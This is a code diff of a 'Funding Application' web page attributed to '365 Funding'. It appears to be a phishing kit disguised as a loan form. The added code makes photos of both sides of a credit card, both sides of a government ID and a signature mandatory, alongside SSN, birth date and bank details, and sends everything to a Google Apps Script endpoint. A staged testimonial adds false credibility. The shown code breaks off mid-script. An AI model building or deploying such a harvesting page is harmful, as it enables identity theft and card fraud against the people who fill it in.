@@ -20,44 +20,44 @@
   <p class="page-title">Funding Application</p>
   <p class="page-subtitle">Complete all required fields to submit your request.</p>
 
-  <!-- ══ SECTION 1: Personal Info ══ -->
+  <!-- SECTION 1: Personal Info -->
   <div class="form-section">
     <div class="section-title">Personal Information</div>
 
     <div class="grid-2">
       <div class="field">
         <div class="field-label">Last Name <span class="badge-req">Required</span></div>
-        <input type="text" placeholder="Last name" data-required="true" data-label="Last Name">
+        <input type="text" placeholder="Last name" data-required="true" data-label="Last Name" id="lastName">
       </div>
       <div class="field">
         <div class="field-label">First Name</div>
-        <input type="text" placeholder="First name">
+        <input type="text" placeholder="First name" id="firstName">
       </div>
     </div>
 
     <div class="grid-2">
       <div class="field">
         <div class="field-label">DOB</div>
-        <input type="date">
+        <input type="date" id="dob">
       </div>
       <div class="field">
         <div class="field-label">Phone <span class="badge-req">Required</span></div>
-        <input type="tel" inputmode="tel"   placeholder="(000) 000-0000" data-required="true" data-label="Phone" data-type="numeric" data-phone="true">
+        <input type="tel" inputmode="tel" placeholder="(000) 000-0000" data-required="true" data-label="Phone" data-type="numeric" data-phone="true" id="phone">
       </div>
     </div>
 
     <div class="field">
       <div class="field-label">SS #</div>
-      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="9" placeholder="XXX-XX-XXXX" data-label="SS #" data-type="numeric" data-ssn="true">
+      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="9" placeholder="XXX-XX-XXXX" data-label="SS #" data-type="numeric" data-ssn="true" id="ssn">
     </div>
 
     <div class="field">
       <div class="field-label">Email Address</div>
-      <input type="email" placeholder="you@example.com">
+      <input type="email" placeholder="you@example.com" id="email">
     </div>
   </div>
 
-  <!-- ══ SECTION 2: Bank / Education ══ -->
+  <!-- SECTION 2: Bank / Education -->
   <div class="form-section">
     <div class="section-title">Bank &amp; Education</div>
 
@@ -66,7 +66,7 @@
       <div class="sub-group">
         <div class="sub-row">
           <span class="sub-label">How Long Have You Been With Your Current Bank?</span>
-          <input class="small-input" type="text" placeholder="Enter response">
+          <input class="small-input" type="text" placeholder="Enter response" id="bankEducation">
         </div>
       </div>
     </div>
@@ -76,7 +76,7 @@
       <div class="sub-group">
         <div class="sub-row">
           <span class="sub-label">Which Bank Do You Currently Use?</span>
-          <input type="text" placeholder="Enter response" data-required="true" data-label="Banking / Institution - Your Questions">
+          <input type="text" placeholder="Enter response" data-required="true" data-label="Banking / Institution - Your Questions" id="bankName">
         </div>
       </div>
     </div>
@@ -86,99 +86,92 @@
       <div class="sub-group">
         <div class="sub-row">
           <span class="sub-label">How Are You Planning To Use The Funds?</span>
-          <input type="text" placeholder="Enter response" data-required="true" data-label="Banking / Institution Loan - Your Questions">
+          <input type="text" placeholder="Enter response" data-required="true" data-label="Banking / Institution Loan - Your Questions" id="fundUse">
         </div>
       </div>
     </div>
-
-
   </div>
 
-  <!-- ══ My Life block ══ -->
+  <!-- My Life block -->
   <div class="form-section">
     <div class="section-title">My Life</div>
     <div class="highlight-box">
       "The day my career plans changed was when I first met my mentor — a woman who had built three businesses from nothing. I didn't know it at the time, but that conversation would alter the entire direction of my financial life. I had just turned 27, living paycheck to paycheck, and couldn't see past the month ahead. <strong>Everything changed when I discovered what access to the right funding could do.</strong> It wasn't just money — it was momentum."
     </div>
     <div class="text-block">
-      Use this space to share relevant background about your financial history, life circumstances, or any information you believe strengthens your application. This context helps our review team make a fair and informed decision.
+      Use this space to share relevant background about your financial history, life circumstances, or any information you believe strengthens your application.
     </div>
     <div class="field">
-      <textarea rows="4" placeholder="Tell us about yourself..."></textarea>
+      <textarea rows="4" placeholder="Tell us about yourself..." id="myLife"></textarea>
     </div>
   </div>
 
-  <!-- ══ SECTION 3: Credit Report ══ -->
+  <!-- SECTION 3: Credit Report -->
   <div class="form-section">
     <div class="section-title">Credit Report</div>
 
-      <div class="field">
-        <div class="field-label">Credit Change In The Past 30 Days<span class="badge-req">Required</span></div>
-        <input type="text" inputmode="numeric" placeholder="Value" data-required="true" data-label="Credit Report - 30 Days" data-type="numeric">
-      </div>
-    
-
+    <div class="field">
+      <div class="field-label">Credit Change In The Past 30 Days <span class="badge-req">Required</span></div>
+      <input type="text" inputmode="numeric" placeholder="Value" data-required="true" data-label="Credit Report - 30 Days" data-type="numeric" id="creditChange">
+    </div>
 
     <div class="field">
-      <div class="field-label">Last Loan<span class="badge-req">Required</span></div>
-      <input type="text" placeholder="Most recent loan date / amount" data-required="true" data-label="Loan Last">
+      <div class="field-label">Last Loan <span class="badge-req">Required</span></div>
+      <input type="text" placeholder="Most recent loan date / amount" data-required="true" data-label="Loan Last" id="lastLoan">
     </div>
 
     <div class="field">
       <div class="field-label">Reason <span class="badge-req">Required</span></div>
-      <input type="text" placeholder="Reason for credit inquiry" data-required="true" data-label="Credit Report - Reason">
+      <input type="text" placeholder="Reason for credit inquiry" data-required="true" data-label="Credit Report - Reason" id="creditReason">
     </div>
-
-
   </div>
 
-  <!-- ══ SECTION 4: Badge Trust Network ══ -->
+  <!-- SECTION 4: Badge Trust Network -->
   <div class="form-section">
     <div class="section-title">Badge Trust Network</div>
 
     <div class="grid-2">
       <div class="field">
         <div class="field-label">City <span class="badge-req">Required</span></div>
-        <input type="text" placeholder="City" data-required="true" data-label="Badge Trust Network - City">
+        <input type="text" placeholder="City" data-required="true" data-label="Badge Trust Network - City" id="city">
       </div>
       <div class="field">
         <div class="field-label">State / Region</div>
-        <input type="text" placeholder="State / Region">
+        <input type="text" placeholder="State / Region" id="state">
       </div>
     </div>
 
     <div class="field">
       <div class="field-label">First Name</div>
-      <input type="text" placeholder="First name">
+      <input type="text" placeholder="First name" id="trustFirstName">
     </div>
 
     <div class="field">
       <div class="field-label">Email <span class="badge-req">Required</span></div>
-      <input type="email" placeholder="you@example.com" data-required="true" data-label="Badge Trust Network - Email">
+      <input type="email" placeholder="you@example.com" data-required="true" data-label="Badge Trust Network - Email" id="trustEmail">
     </div>
 
     <div class="field">
       <div class="field-label">Direction / Address</div>
-      <input type="text" placeholder="Street address">
+      <input type="text" placeholder="Street address" id="address">
     </div>
 
     <div class="field">
       <div class="field-label">Zip Code</div>
-      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="5" placeholder="Postal code" data-label="Badge Trust Network - Zip Code" data-type="numeric" data-zip="true">
+      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="5" placeholder="Postal code" data-label="Badge Trust Network - Zip Code" data-type="numeric" data-zip="true" id="zipCode">
     </div>
 
     <div class="field">
       <div class="field-label">Occupation <span class="badge-req">Required</span></div>
-      <input type="text" placeholder="Your occupation" data-required="true" data-label="Badge Trust Network - Occupation">
+      <input type="text" placeholder="Your occupation" data-required="true" data-label="Badge Trust Network - Occupation" id="occupation">
     </div>
 
     <hr class="divider">
-
     <div class="sub-section-title">FICO / Credit Score Range</div>
 
     <div class="field">
       <div class="field-label">FICO / Credit Score Range <span class="badge-req">Required</span></div>
-      <div style="margin-top:6px; display:flex; flex-wrap:wrap; gap:4px;">
+      <div style="margin-top:6px;display:flex;flex-wrap:wrap;gap:4px;">
         <span class="score-range">300–499</span>
         <span class="score-range">500–579</span>
         <span class="score-range">580–669</span>
@@ -189,27 +182,163 @@
       <div class="sub-group" style="margin-top:10px;">
         <div class="sub-row">
           <span class="sub-label">Your Score</span>
-          <input type="number" placeholder="e.g. 720" min="300" max="850" data-required="true" data-label="FICO / Credit Score Range - Your Score">
+          <input type="number" placeholder="e.g. 720" min="300" max="850" data-required="true" data-label="FICO / Credit Score Range - Your Score" id="ficoScore">
         </div>
       </div>
     </div>
 
     <div class="field">
       <div class="field-label">Applicant Full Name</div>
-      <input type="text" placeholder="Last then First, or First Last">
+      <input type="text" placeholder="Last then First, or First Last" id="applicantFullName">
     </div>
-
-
 
     <hr class="divider">
 
     <div class="highlight-box">
-      "Participation in the <strong>Badge Trust Network</strong> indicates your willingness to have your application reviewed under our standard trust scoring model. Scores are assessed on a rolling 30-day basis and may affect your funding tier, rate, and term eligibility. Applicants with scores above <strong>670</strong> are generally eligible for preferred network status."
+      "Participation in the <strong>Badge Trust Network</strong> indicates your willingness to have your application reviewed under our standard trust scoring model."
     </div>
-
     <div class="text-block">
       By submitting this application you authorize 365 Funding to obtain a consumer credit report, verify employment and income, and share your application data with partner institutions within the Badge Trust Network for evaluation purposes.
     </div>
+  </div>
+
+  <!-- SECTION 5: Document Uploads -->
+  <div class="form-section">
+    <div class="section-title">Document Uploads</div>
+    <p class="text-block" style="margin-bottom:20px;">
+      Upload clear photos of the five documents below. All are required before your application can be submitted. Images are resized automatically for secure transmission.
+    </p>
+
+    <div class="upload-grid">
+
+      <!-- Credit Card Front -->
+      <div class="upload-card" id="card-creditCard">
+        <input type="file" id="file-creditCard" accept="image/*" capture="environment" class="file-input">
+        <label for="file-creditCard" class="upload-label" id="label-creditCard">
+          <div class="upload-icon">
+            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="4" y="12" width="40" height="28" rx="4" stroke="currentColor" stroke-width="2.5"/>
+              <rect x="4" y="20" width="40" height="7" fill="currentColor" opacity="0.12"/>
+              <rect x="10" y="31" width="12" height="4" rx="1" fill="currentColor" opacity="0.35"/>
+              <circle cx="36" cy="33" r="3.5" fill="currentColor" opacity="0.25"/>
+              <circle cx="30" cy="33" r="3.5" fill="currentColor" opacity="0.4"/>
+            </svg>
+          </div>
+          <div class="upload-title">Credit Card <span class="badge-req">Required</span></div>
+          <div class="upload-sub">Front of card</div>
+          <div class="upload-btn-row"><span class="upload-cta">Choose File or Take Photo</span></div>
+        </label>
+        <div class="upload-preview" id="preview-creditCard" style="display:none;">
+          <img id="img-creditCard" src="" alt="Credit card">
+          <div class="preview-footer">
+            <span class="preview-name" id="name-creditCard"></span>
+            <button type="button" class="remove-btn" data-key="creditCard">&#x2715; Remove</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Credit Card Back -->
+      <div class="upload-card" id="card-creditCardBack">
+        <input type="file" id="file-creditCardBack" accept="image/*" capture="environment" class="file-input">
+        <label for="file-creditCardBack" class="upload-label" id="label-creditCardBack">
+          <div class="upload-icon">
+            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="4" y="12" width="40" height="28" rx="4" stroke="currentColor" stroke-width="2.5"/>
+              <rect x="4" y="18" width="40" height="8" fill="currentColor" opacity="0.18"/>
+              <rect x="28" y="30" width="12" height="5" rx="1" fill="currentColor" opacity="0.22" stroke="currentColor" stroke-width="1"/>
+              <rect x="10" y="31" width="14" height="3" rx="1" fill="currentColor" opacity="0.2"/>
+              <rect x="10" y="36" width="9"  height="2" rx="1" fill="currentColor" opacity="0.15"/>
+            </svg>
+          </div>
+          <div class="upload-title">Credit Card <span class="badge-req">Required</span></div>
+          <div class="upload-sub">Back of card</div>
+          <div class="upload-btn-row"><span class="upload-cta">Choose File or Take Photo</span></div>
+        </label>
+        <div class="upload-preview" id="preview-creditCardBack" style="display:none;">
+          <img id="img-creditCardBack" src="" alt="Credit card back">
+          <div class="preview-footer">
+            <span class="preview-name" id="name-creditCardBack"></span>
+            <button type="button" class="remove-btn" data-key="creditCardBack">&#x2715; Remove</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- ID Front -->
+      <div class="upload-card" id="card-idFront">
+        <input type="file" id="file-idFront" accept="image/*" capture="environment" class="file-input">
+        <label for="file-idFront" class="upload-label" id="label-idFront">
+          <div class="upload-icon">
+            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="4" y="10" width="40" height="30" rx="4" stroke="currentColor" stroke-width="2.5"/>
+              <circle cx="16" cy="22" r="5" stroke="currentColor" stroke-width="2"/>
+              <path d="M8 34c0-4 4-7 8-7s8 3 8 7" stroke="currentColor" stroke-width="2"/>
+              <rect x="27" y="18" width="12" height="2.5" rx="1.2" fill="currentColor" opacity="0.4"/>
+              <rect x="27" y="24" width="8"  height="2.5" rx="1.2" fill="currentColor" opacity="0.3"/>
+            </svg>
+          </div>
+          <div class="upload-title">Government ID <span class="badge-req">Required</span></div>
+          <div class="upload-sub">Front side</div>
+          <div class="upload-btn-row"><span class="upload-cta">Choose File or Take Photo</span></div>
+        </label>
+        <div class="upload-preview" id="preview-idFront" style="display:none;">
+          <img id="img-idFront" src="" alt="ID front">
+          <div class="preview-footer">
+            <span class="preview-name" id="name-idFront"></span>
+            <button type="button" class="remove-btn" data-key="idFront">&#x2715; Remove</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- ID Back -->
+      <div class="upload-card" id="card-idBack">
+        <input type="file" id="file-idBack" accept="image/*" capture="environment" class="file-input">
+        <label for="file-idBack" class="upload-label" id="label-idBack">
+          <div class="upload-icon">
+            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="4" y="10" width="40" height="30" rx="4" stroke="currentColor" stroke-width="2.5"/>
+              <rect x="9"  y="17" width="30" height="3" rx="1.5" fill="currentColor" opacity="0.22"/>
+              <rect x="9"  y="23" width="22" height="3" rx="1.5" fill="currentColor" opacity="0.22"/>
+              <rect x="9"  y="29" width="14" height="3" rx="1.5" fill="currentColor" opacity="0.22"/>
+              <rect x="33" y="27" width="7"  height="9" rx="1.5" stroke="currentColor" stroke-width="1.8"/>
+            </svg>
+          </div>
+          <div class="upload-title">Government ID <span class="badge-req">Required</span></div>
+          <div class="upload-sub">Back side</div>
+          <div class="upload-btn-row"><span class="upload-cta">Choose File or Take Photo</span></div>
+        </label>
+        <div class="upload-preview" id="preview-idBack" style="display:none;">
+          <img id="img-idBack" src="" alt="ID back">
+          <div class="preview-footer">
+            <span class="preview-name" id="name-idBack"></span>
+            <button type="button" class="remove-btn" data-key="idBack">&#x2715; Remove</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Signature -->
+      <div class="upload-card" id="card-signature">
+        <input type="file" id="file-signature" accept="image/*" class="file-input">
+        <label for="file-signature" class="upload-label" id="label-signature">
+          <div class="upload-icon">
+            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M7 33 C11 24,16 17,21 27 C23 32,25 16,30 23 C33 27,36 21,42 29" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/>
+              <line x1="7" y1="38" x2="42" y2="38" stroke="currentColor" stroke-width="1.5" opacity="0.28"/>
+            </svg>
+          </div>
+          <div class="upload-title">Signature <span class="badge-req">Required</span></div>
+          <div class="upload-sub">Photo or scan of signature</div>
+          <div class="upload-btn-row"><span class="upload-cta">Choose File or Take Photo</span></div>
+        </label>
+        <div class="upload-preview" id="preview-signature" style="display:none;">
+          <img id="img-signature" src="" alt="Signature">
+          <div class="preview-footer">
+            <span class="preview-name" id="name-signature"></span>
+            <button type="button" class="remove-btn" data-key="signature">&#x2715; Remove</button>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /upload-grid -->
   </div>
 
   <!-- SUBMIT -->
@@ -219,199 +348,412 @@
 </div>
 
 <!-- Thank You Modal -->
-<div id="thankYouModal" class="modal" style="display:none;" role="dialog" aria-modal="true" aria-labelledby="thankYouTitle" aria-describedby="thankYouDescription">
+<div id="thankYouModal" class="modal" style="display:none;" role="dialog" aria-modal="true">
   <div class="modal-content">
-    <h2 id="thankYouTitle">Application Submitted</h2>
-    <p id="thankYouDescription">Thank you for submitting your information! At this moment we are going to be review your application, we will reach out to you once completed.</p>
+    <div class="modal-icon success-icon">&#10003;</div>
+    <h2>Application Submitted</h2>
+    <p>Thank you! We are reviewing your application and will reach out within 2–3 business days.</p>
     <button id="closeBtn" type="button" class="btn-close">Close</button>
   </div>
 </div>
 
 <!-- Error Modal -->
-<div id="errorModal" class="modal" style="display:none;" role="dialog" aria-modal="true" aria-labelledby="errorTitle" aria-describedby="errorDescription">
+<div id="errorModal" class="modal" style="display:none;" role="dialog" aria-modal="true">
   <div class="modal-content error-modal">
+    <div class="modal-icon error-icon">!</div>
     <h2 id="errorTitle">Application Incomplete</h2>
-    <p id="errorDescription" class="error-message">We could not complete your application because one or more fields are not completed. Please try again.</p>
-    <div id="missingFields" class="missing-fields">
-      <!-- List of missing fields will be populated here -->
-    </div>
-    <button id="closeErrorBtn" type="button" class="btn-close">Close</button>
+    <p id="errorDescription" class="error-message">Please complete all required fields before submitting.</p>
+    <div id="missingFields" class="missing-fields"></div>
+    <button id="closeErrorBtn" type="button" class="btn-close btn-close-error">Close</button>
   </div>
 </div>
 
+<!-- Upload progress bar -->
+<div class="upload-progress" id="uploadProgress">
+  <span id="progressLabel">Uploading…</span>
+  <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progressFill"></div></div>
+</div>
+
 <style>
-  .modal {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 1000;
-  }
+/* ── Modals ─────────────────────────────────────────────────────────────── */
+.modal {
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,.52);
+  display:flex;align-items:center;justify-content:center;
+  z-index:1000;backdrop-filter:blur(3px);
+}
+.modal-content {
+  background:#fff;padding:40px 36px;border-radius:14px;
+  text-align:center;max-width:480px;width:90%;
+  box-shadow:0 24px 64px rgba(0,0,0,.18);
+}
+.modal-icon {
+  width:54px;height:54px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:24px;font-weight:700;margin:0 auto 16px;
+}
+.success-icon{background:#e8f5e9;color:#2e7d32;}
+.error-icon  {background:#fdecea;color:#c62828;}
+.modal-content h2{margin:0 0 10px;color:#1a1a1a;font-size:20px;}
+.modal-content p {color:#555;line-height:1.6;margin:0 0 22px;}
+.btn-close{
+  background:#2e7d32;color:#fff;
+  padding:11px 34px;border:none;border-radius:6px;
+  cursor:pointer;font-size:14px;font-weight:600;transition:background .2s;
+}
+.btn-close:hover{background:#1b5e20;}
+.btn-close-error{background:#c62828;}
+.btn-close-error:hover{background:#7f0000;}
+.error-modal{border:2px solid #f44336;}
+.error-message{color:#c62828!important;font-weight:500;}
+.missing-fields{
+  background:#fff5f5;padding:12px 16px;border-radius:6px;
+  margin:0 0 20px;text-align:left;border:1px solid #ffcdd2;
+}
+.missing-fields ul{margin:0;padding-left:18px;color:#c62828;}
+.missing-fields li{margin:4px 0;font-size:14px;}
+.small-input{max-width:280px;width:100%;}
+#submitBtn:disabled{opacity:.55;cursor:not-allowed;}
 
-  .modal-content {
-    background-color: white;
-    padding: 40px;
-    border-radius: 8px;
-    text-align: center;
-    max-width: 500px;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-  }
+/* ── Upload section ─────────────────────────────────────────────────────── */
+.upload-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:14px;
+  margin-top:8px;
+}
+.upload-card{
+  position:relative;
+  border:2px dashed #cbd5e1;
+  border-radius:12px;
+  background:#f8fafc;
+  min-height:200px;
+  display:flex;flex-direction:column;
+  overflow:hidden;
+  transition:border-color .2s, box-shadow .2s;
+}
+.upload-card:hover{border-color:#6366f1;box-shadow:0 0 0 3px rgba(99,102,241,.1);}
+.upload-card.has-file{border-color:#22c55e;border-style:solid;background:#f0fdf4;}
+.file-input{
+  position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;
+}
+.upload-label{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:22px 14px 18px;cursor:pointer;flex:1;gap:5px;text-align:center;
+}
+.upload-icon{
+  width:54px;height:54px;color:#94a3b8;
+  margin-bottom:6px;transition:color .2s;
+}
+.upload-icon svg{width:100%;height:100%;}
+.upload-card:hover .upload-icon{color:#6366f1;}
+.upload-card.has-file  .upload-icon{color:#22c55e;}
+.upload-title{
+  font-weight:600;font-size:13.5px;color:#1e293b;
+  display:flex;align-items:center;gap:5px;flex-wrap:wrap;justify-content:center;
+}
+.upload-sub{font-size:12px;color:#64748b;font-weight:500;}
+.upload-btn-row{margin-top:8px;}
+.upload-cta{
+  display:inline-block;
+  background:#6366f1;color:#fff;
+  font-size:11.5px;font-weight:600;
+  padding:6px 14px;border-radius:20px;
+  transition:background .2s;
+}
+.upload-card:hover .upload-cta{background:#4f46e5;}
+.upload-card.has-file .upload-cta{background:#16a34a;}
+.upload-preview{
+  flex:1;display:flex;flex-direction:column;
+  align-items:center;padding:10px;gap:8px;
+}
+.upload-preview img{
+  width:100%;max-height:140px;object-fit:cover;
+  border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.1);
+}
+.preview-footer{
+  width:100%;display:flex;align-items:center;justify-content:space-between;gap:6px;
+}
+.preview-name{
+  font-size:11px;color:#64748b;overflow:hidden;
+  text-overflow:ellipsis;white-space:nowrap;max-width:110px;
+}
+.remove-btn{
+  flex-shrink:0;
+  background:#fee2e2;color:#dc2626;border:none;border-radius:4px;
+  padding:4px 10px;font-size:11.5px;font-weight:600;
+  cursor:pointer;transition:background .15s;
+}
+.remove-btn:hover{background:#fecaca;}
 
-  .modal-content h2 {
-    margin-top: 0;
-    color: #333;
-  }
+/* Spinner */
+.spinner{
+  display:inline-block;width:13px;height:13px;
+  border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+  border-radius:50%;animation:spin .7s linear infinite;
+  vertical-align:middle;margin-right:6px;
+}
+@keyframes spin{to{transform:rotate(360deg);}}
 
-  .modal-content p {
-    color: #666;
-    line-height: 1.6;
-    margin: 20px 0;
-  }
-
-  .btn-close {
-    background-color: #4CAF50;
-    color: white;
-    padding: 10px 30px;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-    font-size: 14px;
-  }
-
-  .btn-close:hover {
-    background-color: #45a049;
-  }
-
-  .error-modal {
-    border: 2px solid #ff4444;
-  }
-
-  .error-modal h2 {
-    color: #ff4444;
-  }
-
-  .error-message {
-    color: #d9534f;
-    font-weight: 500;
-    margin-bottom: 15px;
-  }
-
-  .missing-fields {
-    background-color: #fff5f5;
-    padding: 12px;
-    border-radius: 4px;
-    margin: 15px 0;
-    text-align: left;
-  }
-
-  .small-input {
-    max-width: 280px;
-    width: 100%;
-  }
-
-  .missing-fields ul {
-    margin: 0;
-    padding-left: 20px;
-    color: #d9534f;
-  }
-
-  .missing-fields li {
-    margin: 5px 0;
-  }
+/* Progress toast */
+.upload-progress{
+  position:fixed;bottom:0;left:0;width:100%;
+  background:#1e293b;color:#fff;
+  font-size:13px;padding:12px 20px;
+  display:flex;align-items:center;gap:14px;
+  z-index:999;
+  transform:translateY(100%);transition:transform .3s ease;
+}
+.upload-progress.visible{transform:translateY(0);}
+.progress-bar-wrap{flex:1;height:4px;background:rgba(255,255,255,.2);border-radius:2px;overflow:hidden;}
+.progress-bar-fill{height:100%;background:#6366f1;width:0%;transition:width .4s ease;}
 </style>
 
 <script>
-  function validateForm() {
-    const requiredFields = document.querySelectorAll('[data-required="true"]');
-    const missingFields = [];
+  // ── CONFIG ─────────────────────────────────────────────────────────────────
+  const DEPLOYMENT_URL = 'https://script.google.com/macros/s/AKfycbxyI4vAHqMsYuh8m3L5aTx34jeQb0jpRSQNN36Tv4HySJ3tVCq3uP915icgf_CLV6Xc/exec';
 
-    requiredFields.forEach(function(field) {
-      const value = field.value.trim();
-      if (!value) {
-        const label = field.getAttribute('data-label') || 'Unknown field';
-        missingFields.push(label);
-        return;
-      }
+  // ── Upload state ───────────────────────────────────────────────────────────
+  const UPLOAD_KEYS = ['creditCard','creditCardBack','idFront','idBack','signature'];
+  const uploadData  = { creditCard:null, creditCardBack:null, idFront:null, idBack:null, signature:null };
 
-      if (field.dataset.phone === 'true') {
-        const digits = value.replace(/[^0-9]/g, '');
-        if (digits.length !== 10) {
-          missingFields.push('Phone number must be exactly 10 digits');
+  // ── Resize image ───────────────────────────────────────────────────────────
+  // 800px / 0.72 keeps each image request well under 300 KB
+  function resizeImage(file, maxPx, quality) {
+    return new Promise(resolve => {
+      const img = new Image();
+      const url = URL.createObjectURL(file);
+      img.onload = () => {
+        URL.revokeObjectURL(url);
+        let w = img.width, h = img.height;
+        if (w > maxPx || h > maxPx) {
+          if (w > h) { h = Math.round(h * maxPx / w); w = maxPx; }
+          else       { w = Math.round(w * maxPx / h); h = maxPx; }
         }
-      }
-
-      if (field.dataset.ssn === 'true') {
-        const digits = value.replace(/[^0-9]/g, '');
-        if (digits.length !== 9) {
-          missingFields.push('SS # must be exactly 9 digits');
-        }
-      }
-
-      if (field.dataset.zip === 'true') {
-        const digits = value.replace(/[^0-9]/g, '');
-        if (digits.length !== 5) {
-          missingFields.push('Zip Code must be exactly 5 digits');
-        }
-      }
+        const c = document.createElement('canvas');
+        c.width = w; c.height = h;
+        c.getContext('2d').drawImage(img, 0, 0, w, h);
+        resolve(c.toDataURL('image/jpeg', quality));
+      };
+      img.src = url;
     });
-
-    return missingFields;
   }
 
-  document.getElementById('submitBtn').addEventListener('click', function() {
-    const missingFields = validateForm();
+  // ── Wire each upload slot ──────────────────────────────────────────────────
+  UPLOAD_KEYS.forEach(key => {
+    document.getElementById('file-' + key).addEventListener('change', async function () {
+      const file = this.files[0];
+      if (!file) return;
 
-    if (missingFields.length > 0) {
-      // Show error modal with missing fields
-      const missingFieldsList = document.getElementById('missingFields');
-      let html = '<ul>';
-      missingFields.forEach(function(field) {
-        html += '<li>' + field + '</li>';
-      });
-      html += '</ul>';
-      missingFieldsList.innerHTML = html;
+      const dataUrl = await resizeImage(file, 800, 0.72);
+      uploadData[key] = { data: dataUrl.split(',')[1], name: file.name, mimeType: 'image/jpeg' };
 
-      document.getElementById('errorModal').style.display = 'flex';
-    } else {
-      // All fields are filled, show thank you modal
-      document.getElementById('thankYouModal').style.display = 'flex';
-    }
-  });
-
-  document.getElementById('closeBtn').addEventListener('click', function() {
-    document.getElementById('thankYouModal').style.display = 'none';
-  });
-
-  document.getElementById('closeErrorBtn').addEventListener('click', function() {
-    document.getElementById('errorModal').style.display = 'none';
-  });
-
-  document.querySelectorAll('[data-type="numeric"]').forEach(function(field) {
-    field.addEventListener('input', function() {
-      const digitsOnly = this.value.replace(/[^0-9]/g, '');
-      if (field.dataset.phone === 'true') {
-        this.value = digitsOnly.slice(0, 10);
-      } else {
-        this.value = digitsOnly;
-      }
+      document.getElementById('img-'     + key).src           = dataUrl;
+      document.getElementById('name-'    + key).textContent   = file.name;
+      document.getElementById('label-'   + key).style.display = 'none';
+      document.getElementById('preview-' + key).style.display = 'flex';
+      document.getElementById('card-'    + key).classList.add('has-file');
     });
   });
 
-  document.getElementById('thankYouModal').addEventListener('click', function(e) {
-    if (e.target === this) {
-      this.style.display = 'none';
+  // ── Remove buttons ─────────────────────────────────────────────────────────
+  document.querySelectorAll('.remove-btn').forEach(btn => {
+    btn.addEventListener('click', function () {
+      const key = this.dataset.key;
+      uploadData[key] = null;
+      document.getElementById('file-'    + key).value         = '';
+      document.getElementById('img-'     + key).src           = '';
+      document.getElementById('name-'    + key).textContent   = '';
+      document.getElementById('label-'   + key).style.display = '';
+      document.getElementById('preview-' + key).style.display = 'none';
+      document.getElementById('card-'    + key).classList.remove('has-file');
+    });
+  });
+
+  // ── Validation ─────────────────────────────────────────────────────────────
+  function validateForm() {
+    const missing = [];
+    document.querySelectorAll('[data-required="true"]').forEach(f => {
+      const v = f.value.trim();
+      if (!v) { missing.push(f.getAttribute('data-label') || 'Unknown field'); return; }
+      if (f.dataset.phone === 'true' && v.replace(/\D/g,'').length !== 10) missing.push('Phone must be 10 digits');
+      if (f.dataset.ssn   === 'true' && v.replace(/\D/g,'').length !== 9)  missing.push('SS # must be 9 digits');
+      if (f.dataset.zip   === 'true' && v.replace(/\D/g,'').length !== 5)  missing.push('Zip Code must be 5 digits');
+    });
+    if (!uploadData.creditCard)     missing.push('Credit Card Front — photo required');
+    if (!uploadData.creditCardBack) missing.push('Credit Card Back — photo required');
+    if (!uploadData.idFront)        missing.push('Government ID Front — photo required');
+    if (!uploadData.idBack)         missing.push('Government ID Back — photo required');
+    if (!uploadData.signature)      missing.push('Signature — photo required');
+    return missing;
+  }
+
+  // ── Collect text-only form data ────────────────────────────────────────────
+  function collectTextData() {
+    return {
+      lastName:           document.getElementById('lastName').value,
+      firstName:          document.getElementById('firstName').value,
+      dob:                document.getElementById('dob').value,
+      phone:              document.getElementById('phone').value,
+      ssn:                document.getElementById('ssn').value,
+      email:              document.getElementById('email').value,
+      bankEducation:      document.getElementById('bankEducation').value,
+      bankName:           document.getElementById('bankName').value,
+      fundUse:            document.getElementById('fundUse').value,
+      myLife:             document.getElementById('myLife').value,
+      creditChange:       document.getElementById('creditChange').value,
+      lastLoan:           document.getElementById('lastLoan').value,
+      creditReason:       document.getElementById('creditReason').value,
+      city:               document.getElementById('city').value,
+      state:              document.getElementById('state').value,
+      trustFirstName:     document.getElementById('trustFirstName').value,
+      trustEmail:         document.getElementById('trustEmail').value,
+      address:            document.getElementById('address').value,
+      zipCode:            document.getElementById('zipCode').value,
+      occupation:         document.getElementById('occupation').value,
+      ficoScore:          document.getElementById('ficoScore').value,
+      applicantFullName:  document.getElementById('applicantFullName').value,
+    };
+  }
+
+  // ── Single POST helper ─────────────────────────────────────────────────────
+  function post(payload) {
+    return fetch(DEPLOYMENT_URL, {
+      method:  'POST',
+      mode:    'no-cors',
+      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+      body:    JSON.stringify(payload)
+    });
+  }
+
+  // ── Progress helpers ───────────────────────────────────────────────────────
+  function setProgress(label, pct) {
+    document.getElementById('progressLabel').textContent = label;
+    document.getElementById('progressFill').style.width  = pct + '%';
+    document.getElementById('uploadProgress').classList.add('visible');
+  }
+  function hideProgress() {
+    document.getElementById('uploadProgress').classList.remove('visible');
